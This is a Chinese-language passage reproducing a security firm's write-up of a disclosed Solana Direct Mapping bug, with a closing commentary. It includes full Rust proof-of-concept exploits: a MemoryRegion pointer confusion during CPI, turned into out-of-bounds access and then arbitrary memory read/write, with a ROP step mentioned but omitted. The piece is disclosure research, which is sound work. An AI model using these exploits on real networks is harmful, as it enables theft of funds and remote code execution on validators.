(simplified)fn update_caller_account(    invoke_context: &InvokeContext,    memory_mapping: &mut MemoryMapping,    is_loader_deprecated: bool,    caller_account: &mut CallerAccount,    callee_account: &mut BorrowedAccount<'_>,    direct_mapping: bool,) -> Result<(), Error> {    ...    if direct_mapping && caller_account.original_data_len > 0 {        ...        let region = memory_mapping.region(AccessType::Load, caller_account.vm_data_addr)?;        let callee_ptr = callee_account.get_data().as_ptr() as u64;        if region.host_addr.get() != callee_ptr {            region.host_addr.set(callee_ptr);        }    }
```  
  
最直接的问题是：用于正确识别 MemoryRegion 的不变量是否成立？  
  
答案是否定的。  
  
回顾一下，CallerAccount.vm_data_addr 直接来自 VM heap memory 中的 AccountInfo.data.as_ptr()，而这块内存是程序可完全控制的。  
```
fn from_account_info(    invoke_context: &InvokeContext,    memory_mapping: &MemoryMapping,    is_loader_deprecated: bool,    _vm_addr: u64,    account_info: &AccountInfo,    original_data_len: usize,) -> Result<CallerAccount<'a>, Error> {    ...    let (serialized_data, vm_data_addr, ref_to_len_in_vm, serialized_len_ptr) = {        // Double translate data out of RefCell        let data = *translate_type::<&[u8]>(            memory_mapping,            account_info.data.as_ptr() as *const _ as u64,            invoke_context.get_check_aligned(),        )?;        ...        (            serialized_data,            vm_data_addr,            ref_to_len_in_vm,            serialized_len_ptr,        )    };    Ok(CallerAccount {        vm_data_addr,        ...    })}
```  
  
攻击者可以在触发 CPI call 之前，先在 VM memory 中篡改   
AccountInfo.data  
 指针，从而伪造 vm_data_addr。  
  
这会使 update_caller_account 定位到错误的 MemoryRegion，并将该 region 的 host_addr 更新为攻击者目标 account data 的地址，实质上把某个 MemoryRegion 的 virtual memory 错误映射到了不应对应的 host memory。  
## A Failed Exploit that Led Us Deeper  
  
虽然这个 primitive 看起来威力极强，但实际利用并没有想象中那么顺利。  
  
发现这个关键疏漏后，我们开始评估其真实影响。  
  
我们的第一直觉是：  
  
既然 virtual memory 发生了错误映射，就可能绕过 memory write authorization checks。  
  
比如，把一个 writable 的 virtual memory 映射到本应 readonly 的 account data。  
  
仅这一点就足以让攻击者通过修改 token program accounts 来窃取资金。  
  
我们的首个 PoC 就是沿着这个思路实现的，并且在较早版本的 Direct Mapping 上确实可行。  
```
use std::{    ptr,    mem,    rc::Rc,    cell::RefCell,};use solana_program::{    account_info::AccountInfo,    instruction::{        AccountMeta,        Instruction,    },    program::invoke_signed,    entrypoint::{        self,        ProgramResult,    },    pubkey::Pubkey,};entrypoint!(process_instruction);// accounts[0] : LEVERAGE account controlled by ATTACKER and owned by EXPLOIT program // accounts[1] : VICTIM account ATTACKER wants to modify// accounts[2] : BENIGN program that owns VICTIM account ATTACKER wants to modifypub fn process_instruction(    _program_id: &Pubkey,    accounts: &[AccountInfo],    _instruction_data: &[u8],) -> ProgramResult {    // trigger CoW here to prevent future issues    accounts[0].data.borrow_mut()[10] = 2;    // copy data pointers to force the following cpi update_caller_account to update incorrect region    unsafe{        ptr::copy(            mem::transmute::<&Rc<RefCell<&mut [u8]>>, *const u8>(                &accounts[0].data //LEVERAGE            ),            mem::transmute(                mem::transmute::<&Rc<RefCell<&mut [u8]>>, *const u8>(                    &accounts[1].data //VICTIM                )            ),            mem::size_of::<Rc<RefCell<&mut [u8]>>>()        );    }    invoke_signed(        &Instruction::new_with_bincode(            accounts[2].key.clone(),            b"",            vec![                AccountMeta::new(accounts[1].key.clone(), false),            ]        ),        &[            accounts[1].clone(),        ],        &[],    )?;    // this will write to accounts[1].data due to corrupted region.host_addr    accounts[0].data.borrow_mut()[10] = 1;    Ok(())}
```  
  
但当我们拉取最新代码后，PoC 突然失效了。  
  
为什么？  
  
巧合的是，在我们开发 PoC 的同时，Solana 正在积极修补另一个 bug。  
  
我们最初以为那个 patch 与本漏洞无关，但结果它恰好挡住了我们的第一条利用链。  
  
该 patch 修复的是：  
  
MemoryRegion state 在跨 CPI 过程中没有被正确更新。  
  
修复已在那个 commit 中落地，patch 的主要新增如下。  
```
fn update_caller_account_perms(    memory_mapping: &MemoryMapping,    caller_account: &CallerAccount,    callee_account: &BorrowedAccount<'_>,    is_loader_deprecated: bool,) -> Result<(), Error> {    let CallerAccount {        original_data_len,        vm_data_addr,        ..    } = caller_account;    let data_region = account_data_region(memory_mapping, *vm_data_addr, *original_data_len)?;    if let Some(region) = data_region {        match (            region.state.get(),            callee_account.can_data_be_changed().is_ok(),        ) {            (MemoryState::Readable, true) => {                // If the account is still shared it means it wasn't written to yet during this                // transaction. We map it as CoW and it'll be copied the first time something                // tries to write into it.                if callee_account.is_shared() {                    let index_in_transaction = callee_account.get_index_in_transaction();                    region                        .state                        .set(MemoryState::Cow(index_in_transaction as u64));                } else {                    region.state.set(MemoryState::Writable);                }            }            (MemoryState::Writable | MemoryState::Cow(_), false) => {                region.state.set(MemoryState::Readable);            }            _ => {}        }    }    let realloc_region = account_realloc_region(        memory_mapping,        *vm_data_addr,        *original_data_len,        is_loader_deprecated,    )?;    if let Some(region) = realloc_region {        region            .state            .set(if callee_account.can_data_be_changed().is_ok() {                MemoryState::Writable            } else {                MemoryState::Readable            });    }    Ok(())}
```  
  
这个 patch 的思路是：  
  
当 CPI 发生时，account owner 的变更可能会被更新并刷写到 TransactionContext。  
  
一个典型例子是创建新的 token account。  
  
调用方会先把一个空 account 的所有权转给 token program，再由 token program 初始化该 token account 的数据。  
  
显然，在 token program 接管所有权后，调用方程序不应再直接写这个 token account data。  
  
启用 Direct Mapping 后，这就意味着必须同步更新 MemoryRegion state。  
  
最初看，这个 patch 和我们的发现似乎无关。  
  
但不幸的是，state 更新带来的效果是：即便我们能把一个原本 writable 的 MemoryRegion 的 host pointer 指向某个不可写 account data，在 CPI 结束后，这个 MemoryRegion 也会被标记为 readonly。我们的利用因此被杀死。  
  
不过，漏洞本身并没有被修掉。  
  
我们只需要绕过这些新检查，而这正是我们 Anatomist Security 最擅长的事情。  
  
凭借多年的深度安全研究和 CTF 经验，我们擅长把死胡同变成突破口。  
## New Exploitation Strategy  
  
那么，回到起点，我们还能如何利用这个 bug？  
  
这个 bug 的本质是 MemoryRegion.host_addr 混淆。  
  
换句话说，我们可以用另一个 MemoryRegion 的 host_addr 去覆盖任意一个 MemoryRegion 的 host_addr。  
  
我们的第一次尝试，是把一个 writable MemoryRegion 的 host_addr 改成某个 readonly account data buffer；  
  
但这显然不是利用该 bug 的唯一方式。  
  
我们的第二个想法是：  
  
与其尝试写入 readonly account data buffer，不如把一个 writable MemoryRegion 的 host_addr 改到另一个 writable MemoryRegion 的 backing buffer，而这个目标 region 的长度与前者不同，会怎样？  
## The New Attack Vector: Size Confusion  
  
这个新思路把我们带向了完全不同的利用路径。  
  
我们不再尝试绕过权限检查，而是利用不同 account buffer 之间的大小差异来实现 out-of-bound read/write，这是一种在 binary exploitation 中常见的 primitive。  
  
考虑两个都可由攻击者写入的 accounts：  
1. 1. SWAP：一个小尺寸 buffer account，data length 为 0x100  
  
1. 2. LEVERAGE：一个更大的 buffer account，data length 为 0x400，其 host_addr 将被替换为 SWAP 的 host_addr  
  
如果我们能让 LEVERAGE account 的 MemoryRegion 指向 SWAP account 的 buffer，那么访问 LEVERAGE account 的 virtual memory 时，实际会触达 host 侧的 SWAP account data buffer。  
  
由于 LEVERAGE 的 MemoryRegion 大小是 0x400，而底层 SWAP host buffer 只有 0x100，当访问超过 LEVERAGE virtual memory 的前 0x100 字节后，就会映射到 SWAP data buffer 末尾之外。  
  
这样我们就获得了对 host memory 的 out-of-bounds read/write primitive。  
## From Limited OOB to Arbitrary read/write  
  
基于此，我们可以对 SWAP 的 host 侧 data buffer 之后 0x300 字节（0x400 - 0x100）实现 out-of-bounds read/write。  
  
但这个 primitive 仍受限于固定范围，我们需要把它变得更强。  
  
思路很直接：  
  
由于 MemoryRegion 结构本身也位于 host memory，我们可以在越界区域内扫描并定位其他 MemoryRegion 结构。  
  
接着修改这些结构的 host_addr 字段，使其指向我们想访问的目标地址；  
  
随后访问对应的 virtual memory，就能对这些目标地址获得 arbitrary read/write。  
  
我们只需要喷射大量 writable accounts，并进一步拉大 size difference，以提高成功率。  
## Proof-of-Concept  
  
现在我们深入看一个 PoC，展示如何从零开始利用这个漏洞。  
  
该利用需要三个用途不同的特定账户：  
- • SWAP：小缓冲区账户，作为被污染指针指向的目标。它的小 buffer 会被 LEVERAGE 的大虚拟空间错误映射。  
  
- • POINTER：指针账户，其 MemoryRegion.host_addr 会在内存扫描阶段被改写为任意内存地址。该账户作为指针 pivot，用于实现 arbitrary read/write 能力。  
  
- • LEVERAGE：大缓冲区账户，其 MemoryRegion.host_addr 会被劫持并指向 SWAP 的小缓冲区，从而制造 size mismatch 并触发 out-of-bounds access。  
  
### Step 1: Account Preparation  
  
首先，我们希望在 LEVERAGE 和 SWAP 账户上都触发 copy-on-write，同时把 LEVERAGE 缩容到 1 byte，以简化后续代码路径。  
```
// Trigger copy-on-write for dedicated buffersaccounts[leverage_idx].data.borrow_mut()[0] = 1;accounts[swap_idx].data.borrow_mut()[0] = 1;// Resize LEVERAGE to simplify exploit logicaccounts[leverage_idx].realloc(1, false)?;
```  
### Step 2: Fake Pointer Setup  
  
接着，我们要用 LEVERAGE 的 data pointer 覆盖 SWAP 的   
AccountInfo.data  
 pointer。  
  
这样在 CPI 过程中，runtime 在提取 SWAP 的 vm_data_addr 时会错误拿到 LEVERAGE 的 data 地址。  
```
unsafe {    ptr::copy(        mem::transmute::<&Rc<RefCell<&mut [u8]>>, *const u8>(&accounts[leverage_idx].data),        mem::transmute::<&Rc<RefCell<&mut [u8]>>, *mut u8>(&accounts[swap_idx].data),        mem::size_of::<Rc<RefCell<&mut [u8]>>>(),    );}
```  
### Step 3: Vulnerability Trigger via CPI  
  
现在我们发起一个“空操作”的 CPI 调用，并携带被污染的 SWAP 账户，以触发有缺陷的 update_caller_account() 逻辑。  
```
invoke_signed(    &Instruction::new_with_bincode(        *program_id,        b"",        vec![AccountMeta::new(accounts[swap_idx].key.clone(), false)],    ),    &[accounts[swap_idx].clone()],    &[],)?;
```  
  
在这次 CPI 中，runtime 会基于畸形 vm_data_addr 为 SWAP 构造 CallerAccount。  
  
随后在 CPI 返回阶段进入 MemoryRegion 更新流程时，它不会定位到 SWAP 的 MemoryRegion，而会误定位到 LEVERAGE 的 MemoryRegion，并把 LEVERAGE 的 MemoryRegion.host_addr 更新为指向 SWAP buffer。  
### Step 4: Size Mismatch to OOB  
  
接下来，重新扩容 LEVERAGE，制造尺寸不匹配。  
```
// Resize LEVERAGE back to a larger size for memory scanningaccounts[leverage_idx].realloc(0xa00000, false)?;
```  
  
这样一来，当访问 LEVERAGE 超过 SWAP buffer 大小时，就会获得对 host memory 的 out-of-bounds 访问能力。  
### Step 5: Egg Hunting for MemoryRegion  
  
有了越界读写后，就可以在 host memory 中搜索 POINTER 账户对应的 MemoryRegion 结构。  
```
let leverage_data = accounts[leverage_idx].data.borrow_mut();let mut scan_ptr = leverage_data.as_ptr().add(0x2840);  // Start OOB scanningloop {    let check_ptr = scan_ptr as u64;        // Signature matching for MemoryRegion array    if *((check_ptr + 0x18) as *const u64) == 0x000000040020a238 &&       *((check_ptr + 0x58) as *const u64) == 0x0000000400202908 &&       *((check_ptr + 0x98) as *const u64) == 0x000000040020f308 &&       *((check_ptr + 0xd8) as *const u64) == 0x0000000400000000 {        // Bingo!        ...    }    ...}
```  
  
这里使用了非常直接的 signature matching 来定位 POINTER 的 MemoryRegion。  
  
由于 VM memory layout 固定，MemoryRegion 内针对特定 input account 索引的 pointer 字段也是固定的，因此可以把这些 VM 布局中的 pointer 常量硬编码为签名。  
### Step 6: Arbitrary R/W via MemoryRegion Hijacking  
  
成功定位目标 MemoryRegion 后，可覆写 POINTER 账户的 MemoryRegion.host_addr，并将其 state 设为 writable，以实现任意内存访问。  
  
例如可计算 thread memory base，并利用 ROP gadgets 劫持返回地址。  
```
let thread_mem = (*((data_ptr + 0x48) as *const u64) >> 21) << 21;// Overwrite POINTER account's backing buffer pointer (arb_ptr)*((data_ptr + 0x490) as *mut u64) = thread_mem;// Set memory region state to writable*((data_ptr + 0x4b8) as *mut u64) = 1;
```  
## Final Exploit  
  
把前面的部分整合起来，下面就是最终的 PoC。  
```
use std::{ptr, mem, rc::Rc, cell::RefCell};use solana_program::{    account_info::AccountInfo,    instruction::{AccountMeta, Instruction},    program::invoke_signed,    entrypoint,    entrypoint::ProgramResult,    pubkey::Pubkey,};entrypoint!(process_instruction);// accounts[0]: SWAP account controlled by ATTACKER, owned by this EXPLOIT program.// accounts[1]: POINTER account whose MemoryRegion will point to an arbitrary address.// accounts[6]: LEVERAGE account controlled by ATTACKER, owned by this EXPLOIT program.pub fn process_instruction(    program_id: &Pubkey,    accounts: &[AccountInfo],    _instruction_data: &[u8],) -> ProgramResult {    if accounts.len() == 8 {        let swap_idx = 0;        let pointer_idx = 1;        let leverage_idx = 6;        // Prepare LEVERAGE and SWAP accounts to set up memory layout        accounts[leverage_idx].data.borrow_mut()[0] = 1;        accounts[swap_idx].data.borrow_mut()[0] = 1;        // Resize LEVERAGE to simplify exploit logic        accounts[leverage_idx].realloc(1, false)?;        // Overwrite SWAP's data pointer with LEVERAGE's pointer        unsafe {            ptr::copy(                mem::transmute::<&Rc<RefCell<&mut [u8]>>, *const u8>(&accounts[leverage_idx].data),                mem::transmute::<&Rc<RefCell<&mut [u8]>>, *mut u8>(&accounts[swap_idx].data),                mem::size_of::<Rc<RefCell<&mut [u8]>>>(),            );        }        // Invoke CPI call to trigger pointer confusion        invoke_signed(            &Instruction::new_with_bincode(                *program_id,                b"",                vec![AccountMeta::new(accounts[swap_idx].key.clone(), false)],            ),            &[accounts[swap_idx].clone()],            &[],        )?;        // Resize LEVERAGE back to a larger size for memory scanning        accounts[leverage_idx].realloc(0xa00000, false)?;        unsafe {            // Scan memory to locate MemoryRegion structure            let mut data_ptr = accounts[leverage_idx].data.borrow_mut().as_ptr() as u64 + 0x2840;            let arb_ptr = accounts[pointer_idx].data.borrow_mut().as_ptr() as u64;            loop {                // Signature matching to reliably identify MemoryRegion                if *((data_ptr + 0x18) as *const u64) == 0x000000040020a238 &&                   *((data_ptr + 0x58) as *const u64) == 0x0000000400202908 &&                   *((data_ptr + 0x98) as *const u64) == 0x000000040020f308 &&                   *((data_ptr + 0xd8) as *const u64) == 0x0000000400000000 {                    let thread_mem = (*((data_ptr + 0x48) as *const u64) >> 21) << 21;                    // Overwrite POINTER account's backing buffer pointer (arb_ptr)                    *((data_ptr + 0x490) as *mut u64) = thread_mem;                    // Set memory region state to writable                    *((data_ptr + 0x4b8) as *mut u64) = 1;                    // At this point, arb_ptr (accounts[pointer_idx]) points to arbitrary memory.                    // ROP chain setup would occur here (omitted).                    return Ok(());                }                // Move to next potential MemoryRegion structure                data_ptr += (*((data_ptr + 0x08) as *const u64) >> 4) << 4;            }        }        // Note: computation budget exhaustion may be necessary in real-world scenarios    }    Ok(())}
```  
  
在成功获得任意读写能力后，可以通过传统的二进制漏洞利用方法进一步达到远程代码执行（RCE）。  
  
需要特别说明的是，这里展示的 PoC 远未稳定到可以对活跃的 Solana 网络发起攻击。  
  
具体来说，我们还没有实现 account spraying，并且在计算 thread stack 和 ROPgadgets 时使用了硬编码偏移。  
  
不过，将这类 PoC 武器化为可利用程序有一些成熟方法，这里就留给感兴趣的读者自行研究。  
## Final Thoughts  
  
如上所示，即使是 Rust 这类内存安全语言，在使用 unsafe 代码追求极致性能和优化的复杂系统中，也可能隐藏细微但威力巨大的漏洞。  
  
最初只是出于对 Solana 的 JIT 和内存模型的好奇，最终却演化成一个关键发现，理论上可能危及整个网络的完整性。  
  
在我们向 Solana 披露该漏洞期间，团队响应非常及时，也很快理解了报告中的核心概念。  
  
他们还做出了重要决策，例如将 Direct Mapping 功能暂缓上线并继续审查，而不是为了赶进度仓促发布。  
  
漏洞不可避免，但 Solana 对漏洞披露的专业处理体现了其对安全的重视，也说明了它为何能成为顶级项目。  
  
我们在这个漏洞研究过程中收获了很多乐趣：读代码、深入理解系统设计、构造非显而易见的利用路径。  
  
这正是我们热爱的挑战。  
  
希望这篇文章能让你看到漏洞挖掘的真实过程。它不只是最终的 exploit，更是过程中那些转折、死胡同与直觉判断。  
  
希望你读得开心，就像我们研究时一样投入。  
  
thanks https://anatomi.st/blog/2025_06_27_pwning_solana_for_fun_and_profit  
  
Author: Anatomist Security  
## 漏洞点评  
  
这次案例非常精彩，完整体现了二进制漏洞利用的思维演进。  
  
一旦攻击者拿到内存读写原语，程序控制权就可能被逐步接管。  
  
更巧妙的是，这条利用链并非一开始就成功，而是经历了“绕过检查失败 -> 转向 Size Confusion -> 获得 OOB -> 扩展为 Arbitrary Read/Write -> 走向 RCE”的路径跃迁。这正是二进制安全最令人着迷的地方。  
  
基础设施层的安全问题，确实具有系统性风险，严重时会影响整个生态信心。  
  
但行业能否持续发展，关键不在于“是否出现漏洞”，而在于“如何应对漏洞”。  
  
Chromium 长期面对 RCE 与在野利用，却并未阻止其在 CS -> BS 时代成为核心基础设施，原因就在于持续披露、快速修复和工程化防御能力。  
  
安全对抗本身，也始终是高强度、强挑战、强进化的技术战场。  
  
最后，绝对安全并不存在。  
  
安全不是一个终点，而是贯穿系统设计、开发、上线和运营全过程的常态能力。  
  
安全，永远无处不在。  
  
   
  
  
